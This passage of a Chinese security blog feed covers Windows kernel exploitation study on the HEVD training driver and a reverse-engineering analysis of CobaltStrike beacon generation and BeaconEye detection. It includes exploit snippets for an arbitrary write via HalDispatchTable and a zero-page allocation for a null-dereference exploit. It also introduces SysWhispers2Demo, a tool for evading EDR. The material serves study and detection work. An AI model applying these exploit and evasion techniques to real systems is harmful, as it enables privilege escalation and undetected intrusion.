class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</div><div class="line">EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase),&amp;lpcbNeeded);   <span class="comment">//#include&lt;Psapi.h&gt;</span></div><div class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; (lpcbNeeded / <span class="keyword">sizeof</span>(LPVOID)); i++)</div><div class="line">&#123;</div><div class="line">GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, <span class="number">48</span>);</div><div class="line"><span class="keyword">if</span> (!<span class="built_in">strcmp</span>(lpfileName, <span class="string">"ntkrnlpa.exe"</span>))</div><div class="line">&#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[+]success to get %s\n"</span>, lpfileName);</div><div class="line"><span class="keyword">return</span> lpImageBase[i];</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第三步，触发漏洞，将Shellcode地址作为What参数传入，然后将<code>HalDispatchTable+4</code>作为Where传入，因为任意地址覆盖，就可以将Shellcode地址覆盖到<code>HalDispatchTable+4</code>地址，然后只需要调用<code>NtQueryIntervalProfile</code>触发执行就可以了。<code>NtQueryIntervalProfile</code>第一个参数值应该可以任意数字。</p><h2 id="0x4-3-参考"><a href="#0x4-3-参考" class="headerlink" title="0x4.3 参考"></a>0x4.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-252506.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(3)-任意内存覆盖漏洞</a></li><li><a href="https://bbs.pediy.com/thread-270176.htm" target="_blank" rel="external">HEVD学习笔记之任意地址写入</a></li></ul><h1 id="0x5-空指针解引用"><a href="#0x5-空指针解引用" class="headerlink" title="0x5 空指针解引用"></a>0x5 空指针解引用</h1><h2 id="0x5-1-成因分析"><a href="#0x5-1-成因分析" class="headerlink" title="0x5.1 成因分析"></a>0x5.1 成因分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;释放完内存并将指针清空，但如果再次对这个指针进行引用，就会触发空指针引用漏洞，值得注意的是，要区分UAF和空指针解引用的区别，即，UAF是因为释放了内存，但是指针并没有置NULL，从而导致程序出现异常，<strong>可以通过占位的方式对该漏洞进行利用。</strong>而空指针解引用是指释放了内存，同时也置空了指针，但是仍对该指针进行引用导致异常。因为对空指针进行引用，<strong>如果提前在地址为0的地方提前写入shellcode，即可对空指针解引用进行利用。</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">typedef void(* pFuncAddr)()<span class="comment">;</span></div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    printf(<span class="string">"test\n"</span>)<span class="comment">;</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">int</span> main()</div><div class="line">&#123;</div><div class="line">    PDWORD <span class="function"><span class="keyword">func</span> = <span class="params">(PDWORD)</span><span class="title">malloc</span><span class="params">(<span class="number">4</span>)</span>;</span></div><div class="line">    *<span class="function"><span class="keyword">func</span> = <span class="params">(DWORD)</span><span class="title">test</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    free(<span class="function"><span class="keyword">func</span>);</span></div><div class="line">    <span class="function"><span class="keyword">func</span> = <span class="title">NULL</span>;</span></div><div class="line">    ((pFuncAddr)*<span class="function"><span class="keyword">func</span>)<span class="params">()</span>;</span></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在HEVD中，空指针解引用漏洞位于<code>TriggerNullPointerDereference</code>函数中，反汇编效果所示，首先在第9行，Allocate空间，然后在19行比较传入的数据是否是<code>BAD0B0B0</code>,如果是在为KernelBuffer赋值，并设置回调函数，如果不是，如33，34行所示则<code>释放内存，并将指针置空</code>。无论是否为<code>BAD0B0B0</code>都会调用KernelBuffer的回调函数，也就是使用了KernelBuffer。如果KernelBuffer指针没有置空，是不会有问题的，但如果KernelBuffer指针置空了，就会导致空指针解引用。<br>    <img src="http://hacky.wang/blog/20220725/i1iNM91vbJD8.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过观察HEVD源码，发现修复之后的的逻辑是先校验了NullPointerDereference指针是否为空，然后在调用回调函数。<br>    <img src="http://hacky.wang/blog/20220725/fFW4YxQesO5c.png?images![](空指针解引用" alt="mark">lim)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">这篇文章</a>里面，也很好介绍了空指针和野指针(UAF)</p><h2 id="0x5-2-漏洞利用"><a href="#0x5-2-漏洞利用" class="headerlink" title="0x5.2 漏洞利用"></a>0x5.2 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前面也具体讲了如何根据空指针解引用来进行漏洞利用，因为部分exp写的还是比较复杂，详细说说，这个漏洞利用就是通过事先开辟好零页，并将shellcode事先放到回调函数的地方。也就是(Null+4)的地址。<br>    <img src="http://hacky.wang/blog/20220725/g7X2bwkpAN7f.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在观察代码逻辑，只要传入的值不是<code>BAD0B0B0</code>，就会释放之前开辟的内存，并置空指针，从而导致空指针解引用。也就是说R3传入的Buffer内部只要不是<code>BAD0B0B0</code>就可以了。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后来讲一下零页内存，空指针指向的就是零页内存，在漏洞利用过程中，我们使用<code>NtAllocateVirtualMemory</code>ntdll层API函数申请零页内存，具体实现如下。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">BOOL </span>AllocateZeroPage()</div><div class="line">&#123;</div><div class="line">pfnNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(GetModuleHandle(<span class="string">"ntdll.dll"</span>),</div><div class="line"><span class="string">"NtAllocateVirtualMemory"</span>)<span class="comment">;</span></div><div class="line">if (NULL == NtAllocateVirtualMemory)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!] Get NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] NtAllocateVirtualMemory Address is :0x%p \n"</span>, NtAllocateVirtualMemory)<span class="comment">;</span></div><div class="line">NTSTATUS ntStatus = <span class="number">0</span><span class="comment">;</span></div><div class="line">PVOID <span class="keyword">BaseAddress </span>= (PVOID)<span class="number">0x00000001</span><span class="comment">;</span></div><div class="line">SIZE_T RegionSize = <span class="number">0x1000</span><span class="comment">;</span></div><div class="line">ntStatus = NtAllocateVirtualMemory((HANDLE)<span class="number">0xFFFFFFFF</span>,</div><div class="line">&amp;<span class="keyword">BaseAddress,</span></div><div class="line"><span class="keyword"></span><span class="number">0</span>,</div><div class="line">&amp;RegionSize,</div><div class="line">MEM_RESERVE <span class="title">| MEM_COMMIT |</span> MEM_TOP_DOWN,</div><div class="line">PAGE_EXECUTE_READWRITE)<span class="comment">;</span></div><div class="line">if (ntStatus != <span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"[!]Execuate NtAllocateVirtualMemory Error\n"</span>)<span class="comment">;</span></div><div class="line">return FALSE<span class="comment">;</span></div><div class="line">&#125;</div><div class="line">return TRUE<span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我在学习这段代码的时候，有个困惑就是为什么传入的BaseAddress值为什么是<code>(PVOID)0x00000001</code>,然后我看了<a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a>为我解答了疑惑，当BaseAddress为<code>0</code>的时候，并不能在零页内存中开辟空间，将AllocateType设置为MEM_TOP_DOWN，表示自上而下的分配内存，然后当BaseAddress设置为一个低地址，例如<code>1</code>,同时指定分配内存的大小大于这个值,例如<code>0x1000</code>,这样就可以申请到的内存包含了零页内存。</p><h2 id="0x5-3-参考"><a href="#0x5-3-参考" class="headerlink" title="0x5.3 参考"></a>0x5.3 参考</h2><ul><li><a href="https://bbs.pediy.com/thread-270198.htm" target="_blank" rel="external">HEVD学习笔记之空指针引用</a></li><li><a href="https://bbs.pediy.com/thread-252776.htm" target="_blank" rel="external">Windows Kernel Exploit 内核漏洞学习(5)-空指针解引用 </a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-analysis-defense/" target="_blank" rel="external">空指针漏洞防护技术-初级篇</a></li><li><a href="http://blog.nsfocus.net/null-pointer-vulnerability-defense/" target="_blank" rel="external">空指针漏洞防护技术 提高篇</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;HEVD简单学习
    
    </summary>
    
      <category term="漏洞分析" scheme="https://findream.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
  </entry>
  
  <entry>
    <title>CobaltStrike Beacon生成原理分析</title>
    <link href="https://findream.github.io/2022/06/26/CobaltStrike%20Beacon%E7%94%9F%E6%88%90%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2022/06/26/CobaltStrike Beacon生成原理分析/</id>
    <published>2022-06-26T06:02:11.000Z</published>
    <updated>2022-08-18T11:04:46.440Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言与背景"><a href="#0x00-前言与背景" class="headerlink" title="0x00 前言与背景"></a>0x00 前言与背景</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(<a href="https://tttang.com/archive/1631/" target="_blank" rel="external">https://tttang.com/archive/1631/</a>)</p><a id="more"></a><h2 id="0x01-二次开发CobaltStrike"><a href="#0x01-二次开发CobaltStrike" class="headerlink" title="0x01 二次开发CobaltStrike"></a>0x01 二次开发CobaltStrike</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我这是在网上找到的一个由鸡哥反编译的一个CobaltStrike4.1版本，所以不在需要重新反编译了。如下是工作目录。<code>decomplie_src</code>是存储着CS反编译的代码，<code>lib目录</code>存储着cobaltstrike4.1.jar文件，作为库文件。<code>out</code>作为编译输出的目录，<code>src</code>存放着所需要的源码文件，也就是<code>decomplie_src</code>源码的子集。这里需要使用的工具是IDEA。<br>    <img src="http://hacky.wang/blog/20220624/JlMIrVX7WosS.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先新建一个项目，设置好项目名和路径之后，在Project下面新建两个目录，<code>decomplie_src</code>和<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/180Hr5HH5CL2.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/MW2SFwlDHsvD.png?imageslim" alt="mark"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;把反编译之后的decomplie_src目录里面的所有java文件复制到项目中的<code>decomplie_src</code>,并把cobaltstrike4.1.jar文件放到项目中的<code>lib</code>目录。<br>    <img src="http://hacky.wang/blog/20220624/u5icDjw78qF9.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对项目进行设置，添加模块依赖，在路径<code>File--&gt;Project Structure--&gt;Modules--&gt;Dependencies</code>设置SDK。然后在Dependencies这个页面点一下”+”号，添加jar包，完成后点应用。<br>    <img src="http://hacky.wang/blog/20220624/MlCs7zXcxrgt.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/Njln99Ifj5R0.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;进入<code>Artifacts--&gt;JAR--&gt;From modules with dependencies</code>,设置一个MAIN CLASS为<code>aggressor.Aggressor</code>,这个值可以在<code>MANIFEST.MF</code>文件中查看。完成之后就是这样的结果。<br>    <img src="http://hacky.wang/blog/20220624/J5byFdOSvIlw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220624/o8DxDDIsJRol.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后就是将<code>decomplie_src</code>复制到<code>src</code>中，这里直接将网上编译的那个版本的src目录复制到本项目的<code>src</code>目录中，如果有其他需求可以自己从<code>decomplie_src</code>复制添加即可。<br>    <img src="http://hacky.wang/blog/20220624/KQNB44PIg1kw.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>Build --&gt;Build Artifacts --&gt;Build</code>进行编译。在out目录就可以看到生成的.jar文件。<br>    <img src="http://hacky.wang/blog/20220624/KNJt0CWWtRNk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>Run --&gt; Profile--&gt;Edit...</code>编辑配置，选择“+”号，在JAR Application添加一个配置文件。在<code>Path to jar</code>选择编译生成的jar包路径。在<code>VM Optionals</code>填入<code>-XX:+AggressiveHeap -XX:+UseParallelGC</code><br>    <img src="http://hacky.wang/blog/20220624/pRronaNRd0QF.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以后每次要运行或者调试的时候，都可以<code>Run--&gt;Profile--&gt;Run(debug)</code><br>    <img src="http://hacky.wang/blog/20220624/Pr7DFcptxIjA.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后就完成了。<br>    <img src="http://hacky.wang/blog/20220624/LhpRo180mPGe.png?imageslim" alt="mark"></p><h2 id="0x02-beacon生成原理"><a href="#0x02-beacon生成原理" class="headerlink" title="0x02 beacon生成原理"></a>0x02 beacon生成原理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beacon生成主要有3个步骤，首先是将C2Patch的相关数据patch到beacon中，便于beacon使用，第二步，处理beacon的PE数据和添加引导shellcode，这段shellcode是引导执行ReflectiveLoader。第三步将beacon加密，并和一些数据patch到loader中。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在beacon生成这块，主要涉及到4个java文件。BeaconPayload.java主要是对beacon进行C2Profile相关的处理，主要涉及的函数为<code>exportBeaconStage</code>。MalleablePE.java，主要用于对beacon进行一些PE相关的处理，主要涉及的函数为<code>process</code>函数。而BeaconLoader.java主要是patch beacon的开头那段shellcode。主要涉及到<code>patchDOSHeader</code>函数。BaseArtifactUtils主要是将加密beacon数据和一些加密beacon的key之类的数据patch到loader模板上，</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CobaltStrike服务端，通过()生成beacon，经过分析，将断点分别下在<code>WindowsExecutableStageDialog.dialogAction</code>和<code>WindowsExecutableStageDialog.dialogResult</code>这两个函数处。通过 dialogAction函数，选择需要保存的文件的内容或者格式。然后调用<code>SafeDialogs.saveFile</code>函数，弹出保存文件的选择框。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着调用<code>dialogResult</code>函数，dialogResult函数是生成beacon的主要流程，参数的参数var1表示保存beacon的路径。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;依次获取架构类型(x86或者x64)，然后监听器这里选的是reverse_http。<br>    <img src="http://hacky.wang/blog/20220623/QSe5gp6RBP5h.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后调用<code>ScListener.export</code>函数,export函数的作用是通过不同的监听器，选择不同的Stage。本例中是调用eaconPayload.exportBeaconStageHTTP函数。exportBeaconStageHTTP的参数分别是(var1)端口，(var2)链接地址，var3，var4分别是false，var5是架构。通过不同的架构选择不同的BeaconStage数据。<br>    <img src="http://hacky.wang/blog/20220623/rJjcOad9snpb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/7INX6IdrJkKe.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>exportBeaconStage</code>函数中，首先调用<code>SleevedResource.readResource</code>加载指定的beacon原始文件<br>    <img src="http://hacky.wang/blog/20220623/C48efyX0dfK6.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取C2Profile中的uri等C2Profile信息。我曾经根据这些默认的C2Profile的URI信息，捞到过一批有价值的CobaltStrike样本。<br>    <img src="http://hacky.wang/blog/20220623/D83MeRV78tAw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/A4UuK5aWOAXl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在解析完C2Profile数据之后，就会按照一定的顺序将这些C2Profile的参数拼装起来，并patch到beacon中，以供beacon使用。<br>    <img src="http://hacky.wang/blog/20220623/bu0YQ14ummLY.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/uYJiQEmLmNSl.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>beacon\BeaconConstants.java</code>这个文件中，可以看到C2Profile数据拼接序号的含义。在之前分析exportBeaconStageHTTP参数的时候，var1为端口。可以看到这里第二个处理的就是端口。而<code>beacon\BeaconConstants.java</code>文件的第二项的内容也是端口。<br>    <img src="http://hacky.wang/blog/20220623/NTpTzsELKAWb.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/YQ1tnjtbB2AN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拼接C2Profile数据的是和，CobaltStrike使用<code>addShort</code>,<code>addInt</code>,<code>addData</code>,<code>addString</code>四个函数添加数据。其中前三个为基本函数，<code>addString</code>底层是通过<code>addData</code>实现的。以addData为例子，通过分析参数，可知依次添加了index，type，length，和value。且如果是short类型，type为1，如果是int类型，type为2，如果是Data或者string类型呢，type就为3了。<br>    <img src="http://hacky.wang/blog/20220623/S9zasGjerEo7.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/AdwyrgXHhL1Y.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/KERO9tQq3u5y.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后将这些数据转化为byte类型，然后将其与46进行进行异或运算。<br>    <img src="http://hacky.wang/blog/20220623/pxWGVGjqc0x1.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;将读取的原始beacon文件的byte转化为string类型，并定位其中的“AAAABBBBCCCCDDDDEEEEFFFF”字符串。然后用C2Profile数据替换掉。<br>    <img src="http://hacky.wang/blog/20220623/q9NJ8sBWPW3i.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当C2Profile的数据patch到beacon之后呢，开始处理PE数据，CobaltStrike在处理PE数据的时候分为两部，首先会对PE数据进行预处理，也就是从C2Profile中读取关于PE处理的相关数据，例如image_size，compile_time等等，然后对这些PE的基础数据进行处理。<br>    <img src="http://hacky.wang/blog/20220623/qCRTUnlNqiKV.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在对PE数据进行预处理之后呢，根据所选择的架构不同，patch DOS头，也就是前面那段shellcode。首先调用findReflectiveLoader函数，通过导出表获取<code>ReflectiveLoader</code>导出函数地址。然后将该地址填充到shellcode中，其实分析过这种stage类型的beacon会发现，这种payload本质就是一个PE文件，只不过PE头被修改成一段可以执行的shellcode，这个shellcode的目的就是引导至ReflectiveLoader函数。<br>    <img src="http://hacky.wang/blog/20220623/obL6hTFYlzJB.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;构造合适的Loader,在<code>_patchArtifact</code>函数中，首先读取指定的Loader的模板，该模板位于resources/目录下面，然后生成一组随机的byte数组，并用这些数组对beacon进行异或加密，这也是为什么每个生成的beacon都是不一样的原因。<br>    <img src="http://hacky.wang/blog/20220623/Gh1YbaAyjc8N.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后依次保存1024个A所在地址偏移+16这个地址，beacon的长度，异或加密的随机数组，GetModuleHandleA，GetProcAddress函数地址(如果可以的话)，保存加密之后的beacon数据，将上述数据替换到那1024个A处。然后将byte[]写入指定文件即完成beacon的生成。<br>    <img src="http://hacky.wang/blog/20220623/cs0HIULgMsED.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/4ouN66Vuhwxy.png?imageslim" alt="mark"></p><h2 id="0x03-beacon分析调试"><a href="#0x03-beacon分析调试" class="headerlink" title="0x03 beacon分析调试"></a>0x03 beacon分析调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据上面分析，cobalt strike 的stage模式从loader通过CreateThread执行beacon。经过一小段shellcode之后，执行<code>ReflectiveLoader</code>，在<code>ReflectiveLoader</code>处理完PE数据之后，其实是跳转到了DllEntryPoint函数。此处将重点分析beacon对于C2Profile的解析过程。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很显然，在beacon中，第一个函数的作用是定位当前EIP,第二个函数即就是<code>ReflectiveLoader</code>,经过对PE的一些处理之后，最后会执行<code>DllEntryPoint</code>.<br>    <img src="http://hacky.wang/blog/20220623/kxXhOy4zXodd.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/tblBaWchlHIo.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在dwReason为1的时候初始化C2Profile数据，在<code>Sub_339762_Parse_C2Profile</code>函数中，很显然，可以看到将C2Profile进行了解密。在内存中，大概还是以 index，type，length，value的顺序进行分布。<br>    <img src="http://hacky.wang/blog/20220623/Co980Xfz8Qft.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/E6oG4a0EWkvk.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;然后读取整个解密数据，解析出type和value，只将这两项目保存到刚刚malloc的内存中。并且将type和value从偏移为8的地址处开始保存。而这一部分数据的分布顺序就是一些检测工具，例如BeaconEye的检测原理。<br>    <img src="http://hacky.wang/blog/20220623/AMvYidsfiWhw.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/3ezQKal3H90V.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实，往下面翻一番是能找到所链接的server的。<br>    <img src="http://hacky.wang/blog/20220623/P22QPaHCPWFk.png?imageslim" alt="mark"></p><h2 id="0x04-BeaconEye原理分析"><a href="#0x04-BeaconEye原理分析" class="headerlink" title="0x04 BeaconEye原理分析"></a>0x04 BeaconEye原理分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BeaconEye使用C#开发，通过使用yara规则，检测beacon解析之后的C2Profile数据分布实现的。因为libyaraNET库没有x86版本，所以BeaconEye务必编译成X64版本，才可以通过。<br>    <img src="http://hacky.wang/blog/20220623/aa4p8A9xCnKh.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以x86的yara规则举例子，yara第一段为全0，因为C2Profile数据是从+0x08处开始复制的，所以前八个字节没有数据为全0，剩下的数据就很简单了，根据解析C2Profile的变量类型来看，前六个数据类型分别是short，short，int，int，short，short对应的type分别是01，01,02,02,01,01。这样就是检测的原理。<br>    <img src="http://hacky.wang/blog/20220623/ULBCsrwcULaa.png?imageslim" alt="mark"><br>    <img src="http://hacky.wang/blog/20220623/SXcP7yx4SrxN.png?imageslim" alt="mark"></p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ul><li><a href="https://blog.51cto.com/u_15274949/2931535" target="_blank" rel="external">CobaltStrike二次开发环境初探</a></li><li><a href="https://xz.aliyun.com/t/10784" target="_blank" rel="external">CobaltStrike逆向学习系列(2)：Stageless Beacon 生成流程分析</a></li><li><a href="https://xz.aliyun.com/t/10785" target="_blank" rel="external">CobaltStrike逆向学习系列(3)：Beacon C2Profile 解析</a></li><li><a href="https://xz.aliyun.com/t/10832" target="_blank" rel="external">CobaltStrike逆向学习系列(5)：Bypass BeaconEye</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言与背景&quot;&gt;&lt;a href=&quot;#0x00-前言与背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言与背景&quot;&gt;&lt;/a&gt;0x00 前言与背景&lt;/h2&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;本文没有什么创新，只是在学习beacon生成和调试分析和检测beacon的过程中的一些记录。本文首发于跳跳糖安全社区(&lt;a href=&quot;https://tttang.com/archive/1631/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://tttang.com/archive/1631/&lt;/a&gt;)&lt;/p&gt;
    
    </summary>
    
      <category term="攻防技术" scheme="https://findream.github.io/categories/%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>SysWhispers2Demo 简介</title>
    <link href="https://findream.github.io/2022/06/25/SysWhispers2Demo/"/>
    <id>https://findream.github.io/2022/06/25/SysWhispers2Demo/</id>
    <published>2022-06-25T06:02:11.000Z</published>
    <updated>2022-06-25T14:32:29.489Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-项目简介"><a href="#0x00-项目简介" class="headerlink" title="0x00 项目简介"></a>0x00 项目简介</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SysWhispers2Demo是通过逆向分析kernel32.dll或者kernelbase.dll文件，从而仿写部分Win32 API的实现逻辑，以解决部分SysWhispers2使用者在利用SysWhispers2做EDR规避时候所遇到的开发困难。SysWhispers2Demo在仿写Win32 API的时候，<strong>部分采用最小开发原则</strong>，即部分参数需要使用微软API文档所约定的默认参数，以减轻仿写的工作量。项目地址:<a href="https://github.com/findream/SysWhispers2Demo" target="_blank" rel="external">https://github.com/findream/SysWhispers2Demo</a></p><a id="more"></a><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/jthuraisamy/SysWhispers2" target="_blank" rel="external">SysWhispers2</a>主要是由jthuraisamy开发的通过Syscall用来规避EDR。SysWhispers2使用很方便，无需指定windows 操作系统版本，只需要通过syswhispers.py生成Nt*函数所需要的函数参数，调用约定等。但是，Ring3的逻辑需要自己实现，这就是SysWhispers2Demo的目的。</p><h2 id="0x01-文件描述"><a href="#0x01-文件描述" class="headerlink" title="0x01 文件描述"></a>0x01 